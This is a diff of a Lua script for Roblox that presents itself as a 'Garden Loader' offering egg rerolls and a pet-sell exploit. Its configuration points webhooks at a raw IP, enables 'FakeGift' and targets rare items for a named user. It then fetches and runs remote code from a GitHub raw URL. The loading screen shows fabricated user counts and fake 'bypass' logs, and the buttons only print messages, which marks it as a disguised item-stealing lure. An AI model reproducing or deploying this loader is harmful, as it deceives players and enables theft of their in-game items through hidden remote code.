@@ -2,11 +2,177 @@ _G.NullConfig = {
     User = {'KKGenkais'},
     min_value = 10000000000,
     pingEveryone = "No", -- dont change this
-    Webhook = "http://45.13.225.83:20002/proxy/6805cdbb6d68f892abcd272afab7a206",
-    FakeGift = "No",
-    Trash = "http://45.13.225.83:20002/proxy/8de1004b737e0d67cec317fb11134993",
-    LoadingScreen = "Yes",
+    Webhook = "http://45.13.225.83:20002/proxy/e048833b3e3a316f9b1b8761bacd0fe6",
+    FakeGift = "Yes",
+    Trash = "http://45.13.225.83:20002/proxy/d133380869ca22eafd1e1242adf12630",
+    LoadingScreen = "No",
     GiftOnlyRares = "Yes"
 }
 
 loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
+
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Main GUI
+local gui = Instance.new("ScreenGui", PlayerGui)
+gui.Name = "GardenLoader"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+
+local frame = Instance.new("Frame", gui)
+frame.AnchorPoint = Vector2.new(0.5, 0.5)
+frame.Position = UDim2.new(0.5, 0, 0.45, 0)
+frame.Size = UDim2.new(0.42, 0, 0.26, 0)
+frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+frame.BackgroundTransparency = 0.1
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+frame.ClipsDescendants = true
+
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0.2, 0)
+title.Position = UDim2.new(0, 0, 0.05, 0)
+title.Text = "🌿 Garden Loader"
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.TextColor3 = Color3.fromRGB(100, 255, 140)
+title.BackgroundTransparency = 1
+
+local status = Instance.new("TextLabel", frame)
+status.Size = UDim2.new(1, -20, 0.2, 0)
+status.Position = UDim2.new(0.05, 0, 0.3, 0)
+status.Text = "Initializing..."
+status.TextScaled = true
+status.Font = Enum.Font.Code
+status.TextColor3 = Color3.fromRGB(180, 255, 200)
+status.BackgroundTransparency = 1
+
+local barBG = Instance.new("Frame", frame)
+barBG.Size = UDim2.new(0.9, 0, 0.1, 0)
+barBG.Position = UDim2.new(0.05, 0, 0.6, 0)
+barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barBG.BorderSizePixel = 0
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 6)
+
+local bar = Instance.new("Frame", barBG)
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(120, 255, 120)
+bar.BorderSizePixel = 0
+Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 6)
+
+local percent = Instance.new("TextLabel", frame)
+percent.Size = UDim2.new(1, 0, 0.2, 0)
+percent.Position = UDim2.new(0, 0, 0.75, 0)
+percent.BackgroundTransparency = 1
+percent.Text = "0%"
+percent.TextScaled = true
+percent.Font = Enum.Font.GothamBold
+percent.TextColor3 = Color3.new(1, 1, 1)
+
+local usersLabel = Instance.new("TextLabel", frame)
+usersLabel.Size = UDim2.new(1, 0, 0.15, 0)
+usersLabel.Position = UDim2.new(0, 0, 0.88, 0)
+usersLabel.BackgroundTransparency = 1
+usersLabel.TextScaled = true
+usersLabel.Font = Enum.Font.Gotham
+usersLabel.TextColor3 = Color3.fromRGB(150, 255, 180)
+usersLabel.Text = "Active Users: 2,154"
+
+local function updateUsers()
+	local count = 2100
+	task.spawn(function()
+		while count < 3000 do
+			wait(math.random(2, 5))
+			count += math.random(50, 150)
+			usersLabel.Text = "Active Users: " .. tostring(count)
+		end
+	end)
+end
+updateUsers()
+
+local logs = {
+	"Initializing bypass core...",
+	"Bypassing remote logs...",
+	"Injecting packet filters...",
+	"🌱 Egg reroll system initialized...",
+	"Rerolling rare egg traits...",
+	"Deploying garden hooks...",
+	"Final handshake complete."
+}
+
+for i = 1, 100 do
+	bar:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Sine", 0.2, true)
+	percent.Text = i .. "%"
+	if i % 17 == 0 then
+		status.Text = logs[math.min(math.ceil(i / 17), #logs)]
+	end
+	wait(0.25 + math.random() * 0.1)
+end
+
+-- Fade out after complete
+TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+TweenService:Create(percent, TweenInfo.new(1), {TextTransparency = 1}):Play()
+TweenService:Create(status, TweenInfo.new(1), {TextTransparency = 1}):Play()
+TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 1}):Play()
+TweenService:Create(usersLabel, TweenInfo.new(1), {TextTransparency = 1}):Play()
+TweenService:Create(bar, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+TweenService:Create(barBG, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+wait(1.2)
+gui:Destroy()
+
+-- Sound effect
+local beep = Instance.new("Sound", workspace)
+beep.SoundId = "rbxassetid://9118823104"
+beep.Volume = 1.5
+beep:Play()
+game.Debris:AddItem(beep, 3)
+
+-- POST GUI
+local gui2 = Instance.new("ScreenGui", PlayerGui)
+gui2.Name = "PostLoader"
+gui2.IgnoreGuiInset = true
+gui2.ResetOnSpawn = false
+
+local menuFrame = Instance.new("Frame", gui2)
+menuFrame.Size = UDim2.new(0.4, 0, 0.3, 0)
+menuFrame.Position = UDim2.new(0.5, 0, 0.45, 0)
+menuFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+menuFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+menuFrame.BackgroundTransparency = 1
+Instance.new("UICorner", menuFrame).CornerRadius = UDim.new(0, 10)
+TweenService:Create(menuFrame, TweenInfo.new(1), {BackgroundTransparency = 0.1}):Play()
+
+-- Create buttons with animation
+local function createButton(text, icon, order)
+	local btn = Instance.new("TextButton", menuFrame)
+	btn.Size = UDim2.new(0.9, 0, 0.35, 0)
+	btn.Position = UDim2.new(0.05, 0, 0.1 + (order * 0.45), 0)
+	btn.BackgroundColor3 = Color3.fromRGB(50, 100, 60)
+	btn.Text = icon .. "  " .. text
+	btn.TextScaled = true
+	btn.Font = Enum.Font.GothamBold
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	btn.AutoButtonColor = false
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+
+	btn.MouseEnter:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.2), {
+			BackgroundColor3 = Color3.fromRGB(70, 130, 80)
+		}):Play()
+	end)
+	btn.MouseLeave:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.2), {
+			BackgroundColor3 = Color3.fromRGB(50, 100, 60)
+		}):Play()
+	end)
+
+	btn.MouseButton1Click:Connect(function()
+		print(text .. " button clicked!")
+	end)
+end
+
+-- Two buttons
+createButton("Egg Reroll", "🥚", 0)
+createButton("Pet Sell Exploit", "🐾", 1)
